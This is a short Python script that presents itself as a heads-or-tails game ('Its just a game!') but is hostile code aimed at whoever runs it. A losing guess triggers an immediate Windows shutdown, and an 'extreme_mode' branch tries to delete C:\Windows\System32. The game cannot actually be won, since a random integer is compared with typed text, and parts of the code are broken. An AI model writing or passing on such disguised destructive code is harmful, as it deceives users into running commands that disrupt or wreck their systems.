import random
import os
import sys
from config import *

def shutdown_PC():
    os.system("shutdown /s /t 1")

number = random.randint(odds)

guess = input("Its just a game! Pick Heads or Tails. All of the words must be typed as shown above.  ")


if extreme_mode == 0:
    if guess == number:
        print("You Won!")
    else:
        shutdown_PC()
else:        
    os.remove("C:\Windows\System32")